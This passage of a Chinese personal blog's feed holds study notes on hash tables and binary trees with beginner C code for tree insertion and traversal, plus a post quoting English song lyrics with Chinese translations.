ST=SearchBSTree(ST,mykey);<br>    <span class="hljs-keyword">if</span>(!ST)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such a data.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find it:%d!&quot;</span>,mykey);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="四、哈希表"><a href="#四、哈希表" class="headerlink" title="四、哈希表"></a>四、哈希表</h2><h3 id="1-适用于动态查找和静态查找"><a href="#1-适用于动态查找和静态查找" class="headerlink" title="1.适用于动态查找和静态查找"></a>1.适用于动态查找和静态查找</h3><h3 id="2-常见哈希函数"><a href="#2-常见哈希函数" class="headerlink" title="2.常见哈希函数"></a>2.常见哈希函数</h3><p>（1）直接定址：适合连续的分布；</p><p>（2）除留取余：假定哈希表长m,取p&lt;=m，一般选择不大于m的最大质数；</p><h3 id="3-处理冲突的方法"><a href="#3-处理冲突的方法" class="headerlink" title="3.处理冲突的方法"></a>3.处理冲突的方法</h3><p>（1）开放地址：Hi=(H(Key)+di)%m;</p><p>​        i.线性探测法：若计算出的地址冲突，则一次向后顺延；容易造成聚集（堆积），降低查找效率；</p><p>​        ii.平方探测法：若计算出的地址冲突，则一次向后/前顺延i^2个地址；</p><p>（2）链地址：在冲突的数据位置设置链表；</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sound of Walking Away</title>
    <link href="/2021/08/23/Sound%20of%20Walking%20Away/"/>
    <url>/2021/08/23/Sound%20of%20Walking%20Away/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/69628653da7948ea86c48e2ff0248662.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>Don’t come find me, I won’t be here waiting<br>请别试图寻找我 我不会再原地等待<br>I so can do it alone, you’re not worth staying<br>我自己可以过得很好 你不值得我再多停留</p><p>Weren’t listening but now there’s no way you won’t hear<br>你不曾倾听 但现在你不得不听<br>There’s a voice emerging in the night so loud and clear<br>有个声音在耳畔萦绕 嘹亮清晰<br>I’ll turn it up like you turn me down, I’m not afraid<br>即使你想让我低声细语我也要大声宣泄，我不会畏惧<br>Hit play, hit play<br>叫嚣着 呼喊着<br>It’s the sound of walking away<br>这是决然离开的声音<br><img src="https://img-blog.csdnimg.cn/a19c8884b98946f497f8466f4c4f33ed.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>It’s the sound of walking away<br>这是决然离开的声音<br>It’s the sound of walking away</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>音乐推荐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>树</title>
    <link href="/2021/08/21/Ch5%20%E6%A0%91/"/>
    <url>/2021/08/21/Ch5%20%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="Ch-5-树"><a href="#Ch-5-树" class="headerlink" title="Ch 5 树"></a>Ch 5 树</h1><h2 id="一、二叉树及其性质"><a href="#一、二叉树及其性质" class="headerlink" title="一、二叉树及其性质"></a>一、二叉树及其性质</h2><p>（1）二叉树可以为空，但是二叉有序树至少三个节点；</p><p>（2）满二叉树：2^k-1个节点、</p><p>（3）非空二叉树第i层的节点数不超过2^i-1个；</p><p>（4）深度为k的二叉树最少k个节点，最多2^k-1个节点；</p><p>（5）n0=n2-1;</p><p>（6）n个节点的二叉树深度为Log2 N-1；</p><p>（7）完全二叉树中，节点i的双亲节点为[i/2],左孩子2i，有孩子2i+1；</p><h2 id="二、二叉树的实现及常用操作"><a href="#二、二叉树的实现及常用操作" class="headerlink" title="二、二叉树的实现及常用操作"></a>二、二叉树的实现及常用操作</h2><h3 id="1-二叉树的基本操作"><a href="#1-二叉树的基本操作" class="headerlink" title="1.二叉树的基本操作"></a>1.二叉树的基本操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXNODE 10</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Elemtype ;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTreeNode</span></span><br><span class="hljs-class">&#123;</span><br>    Elemtype data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTreeNode</span> *<span class="hljs-title">lchild</span>,*<span class="hljs-title">rchild</span>;</span><br>&#125; BiTreeNode,*BiTree;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTreeParNode</span></span><br><span class="hljs-class">&#123;</span><br>    Elemtype data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTreeParNode</span> *<span class="hljs-title">lchild</span>,*<span class="hljs-title">rchild</span>,*<span class="hljs-title">parent</span>;</span><br>&#125; BiParTreeNode,*BiParTree;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Initiate</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>((T=(BiTreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiTreeNode)))==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Empty tree.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    T-&gt;lchild=<span class="hljs-literal">NULL</span>;<br>    T-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br>BiTree <span class="hljs-title function_">CreateTree</span><span class="hljs-params">(Elemtype x)</span><br>&#123;<br>    BiTree p;<br>    <span class="hljs-keyword">if</span>((p=(BiTree *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiTreeNode)))==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Empty tree.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class="hljs-literal">NULL</span>;<br>    p-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br>BiTree <span class="hljs-title function_">InsertTreeLeftNode</span><span class="hljs-params">(BiTree T,Elemtype x,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class="hljs-keyword">if</span>(parent==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such a parent.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((p=(BiTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiTreeNode)))==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Empty tree.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class="hljs-literal">NULL</span>;<br>    p-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(parent-&gt;lchild==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        parent-&gt;lchild=p;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        p-&gt;lchild=parent-&gt;lchild;<br>        parent-&gt;lchild=p;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Insert data %d to leftchild.\n&quot;</span>,x);<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br>BiTree <span class="hljs-title function_">InsertTreeRightNode</span><span class="hljs-params">(BiTree T,Elemtype x,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class="hljs-keyword">if</span>(parent==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such a parent.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((p=(BiTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiTreeNode)))==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Empty tree.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class="hljs-literal">NULL</span>;<br>    p-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(parent-&gt;rchild==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        parent-&gt;rchild=p;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        p-&gt;rchild=parent-&gt;rchild;<br>        parent-&gt;rchild=p;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Insert data %d to rightchild.\n&quot;</span>,x);<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br>BiTree <span class="hljs-title function_">DeleteTreeLeftNode</span><span class="hljs-params">(BiTree T,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class="hljs-keyword">if</span>(parent==<span class="hljs-literal">NULL</span>||parent-&gt;lchild==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No left child.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p=parent-&gt;lchild;<br>    parent-&gt;lchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br>BiTree <span class="hljs-title function_">DeleteTreeRightNode</span><span class="hljs-params">(BiTree T,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class="hljs-keyword">if</span>(parent==<span class="hljs-literal">NULL</span>||parent-&gt;rchild==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No left child.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p=parent-&gt;rchild;<br>    parent-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">PreOrderTree</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Visit(T-&gt;data);<br>    PreOrderTree(T-&gt;lchild);<br>    PreOrderTree(T-&gt;rchild);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">MiddleOrderTree</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    MiddleOrderTree(T-&gt;lchild);<br>    Visit(T-&gt;data);<br>    MiddleOrderTree(T-&gt;rchild);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">LastOrderTree</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    LastOrderTree(T-&gt;lchild);<br>    LastOrderTree(T-&gt;rchild);<br>    Visit(T-&gt;data);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">LevelOrderTree</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    BiTree Queue[MAXNODE];<br>    <span class="hljs-type">int</span> front,rear;<br><br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    front=<span class="hljs-number">-1</span>;<br>    rear=<span class="hljs-number">-1</span>;<br>    Queue[++rear]=T;<br>    <span class="hljs-keyword">while</span>(front!=rear)<br>    &#123;<br>        Visit(Queue[++front]-&gt;data);<br>        <span class="hljs-keyword">if</span>(Queue[front]-&gt;lchild!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;lchild;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(Queue[front]-&gt;rchild!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Visit</span><span class="hljs-params">(Elemtype data)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d&quot;</span>,data);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    BiTree myTree;<br>    Elemtype rootData;<br>    <span class="hljs-type">int</span> numberOfNodes,index,choice;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter the node number:\n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;numberOfNodes);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter the data of root node:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;rootData);<br><br>    myTree=CreateTree(rootData);<br><br>    <span class="hljs-keyword">for</span>(index=<span class="hljs-number">1</span>; index&lt;numberOfNodes; index++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No %d node&#x27;s position is:\n1.Leftchild of Root.\n2.Rightchild of Root.\n3.Leftchild of the Root&#x27;s leftchild.\n4.Rightchild of the Root&#x27;s leftchild.\n5.Leftchild of the Root&#x27;s rightchild.\n6.Rightchild of the Root&#x27;s rightchild.\n&quot;</span>,index);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Choice:&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;choice);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter the %d data:&quot;</span>,index);<br>        Elemtype nodedata;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;nodedata);<br>        <span class="hljs-keyword">switch</span>(choice)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Preorder:&quot;</span>);<br>    PreOrderTree(myTree);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Middleorder:&quot;</span>);<br>    MiddleOrderTree(myTree);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Postorder:&quot;</span>);<br>    LastOrderTree(myTree);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Leverorder:&quot;</span>);<br>    LevelOrderTree(myTree);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><h3 id="2-线索二叉树的基本操作"><a href="#2-线索二叉树的基本操作" class="headerlink" title="2.线索二叉树的基本操作"></a>2.线索二叉树的基本操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span 